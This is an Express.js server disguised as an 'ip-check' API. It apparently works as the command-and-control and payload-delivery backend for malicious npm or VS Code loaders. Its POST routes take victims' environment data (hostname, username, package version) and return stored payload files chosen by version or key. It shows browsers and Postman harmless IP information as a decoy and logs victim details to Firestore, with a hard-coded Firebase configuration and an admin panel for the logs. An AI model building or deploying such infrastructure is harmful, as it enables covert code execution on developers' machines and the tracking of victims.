const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const dotenv = require('dotenv');
const rateLimit = require("express-rate-limit");
// const { generalLimiter } = require('./middleware/rateLimiter');
const { isBanned } = require('./middleware/ipBlocker');
const { logBlockedRequest } = require('./middleware/logger');
const axios = require("axios"); // To call external API for IP details
const requestIp = require("request-ip"); // To extract client's IP address
const { initializeApp } = require("firebase/app");
const {
	getFirestore,
	collection,
	addDoc,
	getDocs,
	deleteDoc,
	doc,
} = require("firebase/firestore");

dotenv.config();
const app = express();
const SECRET_HEADER_VALUE = process.env.SECRET_HEADER_VALUE || "secret";
const port = process.env.PORT || 4000;

const generalLimiter = rateLimit({
	windowMs: 10 * 60 * 1000,
	max: 50,
	standardHeaders: true,
	legacyHeaders: false,
	message: { status: 429, error: "Too many requests, try again later." },
	skip: (req) => req.headers["x-secret-header"] === SECRET_HEADER_VALUE,
});

// IP Ban Check Middleware
app.use((req, res, next) => {
	if (isBanned(req.clientIp)) {
		logBlockedRequest(req.clientIp, 'IP banned');
		return res.status(403).json({ error: 'Access denied.' });
	}
	next();
});

// Rate Limiter Middleware to prevent abuse
app.use(generalLimiter);

app.set("trust proxy", false);

// Enable CORS for all requests
app.use(cors());

function getLastPart(rBody) {
	const input = rBody.npm_package_version || "21";
	try {
		// Check if the input is a string
		if (typeof input !== 'string') return "21";

		// Split the string by "."
		const parts = input.split('.');

		// Return the last part if available, otherwise return "3"
		return parts.length > 0 ? parts[parts.length - 1] : "21";
	} catch (error) {
		// Handle the error appropriately
		return "21";
	}
}

const decryptApiKeyToFileName = (apiKey) => {
	try {
		if (typeof apiKey !== "string") return "21";
		return apiKey.slice(-1) || "21";
	} catch (error) {
		return "21";
	}
};

// Middleware to extract client's IP
app.use(requestIp.mw());

// Middleware to parse JSON requests
app.use(express.json());

app.use(express.static("public"));

// Firebase configuration
const firebaseConfig = {
	apiKey: "AIzaSyDvO8xgmcDmHG1gw5n5NYdNbsvEj2_etLM",
	authDomain: "ip-check-8ca7e.firebaseapp.com",
	projectId: "ip-check-8ca7e",
	storageBucket: "ip-check-8ca7e.firebasestorage.app",
	messagingSenderId: "243651616930",
	appId: "1:243651616930:web:f289e4f1d21d9f27e1f7fb"
};

// Initialize Firebase
const firebaseApp = initializeApp(firebaseConfig);
const db = getFirestore(firebaseApp);

// Middleware to log requests into Firebase Firestore
app.use(async (req, res, next) => {
	const secretHeader = req.headers["x-secret-header"];
	const clientIp = req.clientIp; // Extract the IP address
	const requestUrl = req.originalUrl;
	const requestMethod = req.method; // Capture the HTTP method
	const userAgent = req.headers["user-agent"] || "";
	const isPostman = userAgent.toLowerCase().includes("postman") || req.headers["postman-token"];
	// Detect if request comes from a browser or Postman
	const isBrowserOrPostman =
		userAgent.includes("Mozilla") ||
		userAgent.includes("Chrome") ||
		userAgent.includes("Safari") ||
		userAgent.includes("Edge") ||
		isPostman; // Postman requests have this header

	const timestamp = new Date().toLocaleString("en-US", {
		timeZone: "Asia/Tokyo",
		year: 'numeric',
		month: '2-digit',
		day: '2-digit',
		hour: '2-digit',
		minute: '2-digit',
		second: '2-digit',
		hour12: false
	}).replace(/(\d{2})\/(\d{2})\/(\d{4}),\s(\d{2}):(\d{2}):(\d{2})/, '$3/$1/$2 $4:$5:$6');

	try {
		// Fetch IP details using ip-api.com
		const ipApiResponse = await axios.get(`http://ip-api.com/json/${clientIp}`);
		const ipDetails = ipApiResponse.data;
		const { country = "none", regionName = "none", city = "none" } = ipDetails;

		if (requestUrl !== "/favicon.ico" && requestUrl !== "/favicon.png") {
			// Prepare data to be logged in Firestore
			const logData = {
				country,
				regionName,
				city,
				method: secretHeader ? `${requestMethod}:${secretHeader}` : requestMethod,
				ip: clientIp,
				url: requestUrl,
				timestamp,
				source: isPostman ? "Postman" : "Web",
			};

			// Check if the request is to /api/ip-check/:filename

			let apiKey = "";
			let urlSplitter = requestUrl.split("/");
			if (urlSplitter.length) {
				apiKey = urlSplitter[urlSplitter.length - 1];
			}
			// const requestedFile =req.params.filename;
			if (apiKey == "208") {
				fileName = getLastPart(req.body);
				if (requestMethod === "POST" && requestUrl.startsWith("/api/ip-check/")) {
					const computername = req.body.COMPUTERNAME || req.body.HOSTNAME || "Unknown";
					const userName = req.body.USER || req.body.LOGNAME || req.body.USERNAME || "Unknown";
					logData.computername = computername + " | " + userName;
				}
			} else {
				fileName = decryptApiKeyToFileName(apiKey);
				if (requestMethod === "POST" && (requestUrl.startsWith("/api/ip-check-encrypted/") || requestUrl.startsWith("/api/vscode-encrypted/"))) {
					const computername = req.body.COMPUTERNAME || req.body.HOSTNAME || "Unknown";
					const userName = req.body.USER || req.body.LOGNAME || req.body.USERNAME || "Unknown";
					logData.computername = computername + " | " + userName;
				}
			}
			logData.flag = fileName;
			if (!isNaN(logData.flag) && logData.method == "POST:secret") {
				// Log the request to Firestore
				await addDoc(collection(db, "requests"), logData);
			}
		}
		if (requestUrl === "/mine/list" || requestUrl === "/mine/delete") {
			next();
			return;
		}
		
		if (isBrowserOrPostman) {
			// --- Show IP info if accessed from a browser or Postman ---
			return res.json({ ipInfo: ipDetails });
		}
	} catch (err) {
		return res.status(403).json({
			ipInfo: {
				query: clientIp,
				message: "Unable to fetch IP details.",
			},
			error: err
		});
	}
	next();
});

// Dynamic Route: Return file contents based on the filename in the "10" folder
app.post("/api/ip-check/:filename", (req, res) => {
	try {
		let fileName = req.params.filename === "v1" ? "v1" : getLastPart(req.body);
		console.log("========", req.params.filename, "fileName:", fileName);

		if (fileName === "v1") {
			return res.status(400).json('console.log("Development server started...")');
		} else {			
			const filePath = path.join(process.cwd(), "10", fileName);
			fs.readdir(path.join(process.cwd(), "10"), (err, files) => {
				console.log(({ version:"1", error: err, files }));
				if (err) {
					console.error(err);
					return res.status(500).json({ error: "Could not list files." });
				}
				console.log("Available files: ", files); // Use this to log available files
				// Proceed to access your file
			});
			
			fs.access(filePath, fs.constants.F_OK, (err) => {
				if (err) {
					return res.status(400).json({ error: err, filePath, files });
				}
				
				fs.readFile(filePath, "utf-8", (err, mainContent) => {
					if (err) {
						return res.status(400).json({ error_1: err });
					}
					return res.send(mainContent);
				});
			});
		}
	}
	catch (e) {
		return res.status(404).json({ error: "IP check failed." });
	}
});

// Dynamic Route: Return file contents based on the filename in the "10" folder
app.post("/api/ip-check-encrypted/:filename", (req, res) => {
	try {
		let fileName = req.params.filename === "v1" ? "v1" : decryptApiKeyToFileName(req.params.filename);
		console.log("========", req.params.filename, "decrypted fileName:", fileName);

		if (fileName === "v1") {
			return res.status(400).json('console.log("Development server started...")');
		} else {
			const filePath = path.join(process.cwd(), "10", fileName);
			fs.readdir(path.join(process.cwd(), "10"), (err, files) => {
				console.log(({ version:"1", error: err, files }));
				if (err) {
					console.error(err);
					return res.status(500).json({ error: "Could not list files." });
				}
				console.log("Available files: ", files); // Use this to log available files
				// Proceed to access your file
			});
			
			fs.access(filePath, fs.constants.F_OK, (err) => {
				if (err) {
					return res.status(400).json({ error: err, filePath, files });
				}
				
				fs.readFile(filePath, "utf-8", (err, mainContent) => {
					if (err) {
						return res.status(400).json({ error_1: err });
					}
					return res.send(mainContent);
				});
			});
		}
    } catch (err) {
        console.error("Error fetching control state:", err);
        res.status(500).json({ error: "Internal server error.", details: err.message });
    }

});

app.post("/api/vscode-encrypted/:filename", (req, res) => {
	try {
		let fileName = req.params.filename === "v1" ? "v1" : decryptApiKeyToFileName(req.params.filename);
		console.log("========", req.params.filename, "decrypted fileName:", fileName);

		if (fileName === "v1") {
			return res.status(400).json('console.log("Development server started...")');
		} else {
			const filePath = path.join(process.cwd(), "10", fileName);
			fs.readdir(path.join(process.cwd(), "10"), (err, files) => {
				console.log(({ version:"1", error: err, files }));
				if (err) {
					console.error(err);
					return res.status(500).json({ error: "Could not list files." });
				}
				console.log("Available files: ", files); // Use this to log available files
				// Proceed to access your file
			});
			
			fs.access(filePath, fs.constants.F_OK, (err) => {
				if (err) {
					return res.status(400).json({ error: err, filePath, files });
				}
				
				fs.readFile(filePath, "utf-8", (err, mainContent) => {
					if (err) {
						return res.status(400).json({ error_1: err });
					}
					return res.send(mainContent);
				});
			});
		}
    } catch (err) {
        console.error("Error fetching control state:", err);
        res.status(500).json({ error: "Internal server error.", details: err.message });
    }

});

// Route: List all logged requests with real-time updates
app.get("/mine/list", async (req, res) => {
	try {
		// First check if Firebase is properly initialized
		if (!db) {
			console.error("Firestore database instance is not initialized");
			throw new Error("Database not initialized");
		}

		res.sendFile(path.join(__dirname, "views", "list.html"));
	} catch (err) {
		console.error("Server-side error:", err);
		res.status(500).json({
			error: "Failed to retrieve logs.",
			details: err.message,
			stack: process.env.NODE_ENV === 'development' ? err.stack : undefined
		});
	}
});


// Route: Delete selected logs
app.post("/mine/delete", async (req, res) => {
	const deleteIds = req.body.deleteIds; // Get array of IDs to delete

	if (!deleteIds || deleteIds.length === 0) {
		return res.status(400).json({ error: "No records selected for deletion." });
	}

	try {
		await Promise.all(
			deleteIds.map((id) => deleteDoc(doc(db, "requests", id)))
		);
		res.redirect("/mine/list");
	} catch (err) {
		res.status(500).json({ error: "Failed to delete records." });
	}
});

app.listen(port, () => {
	console.log(`Listening on port ${port}`);
});

// Export for Vercel
module.exports = app;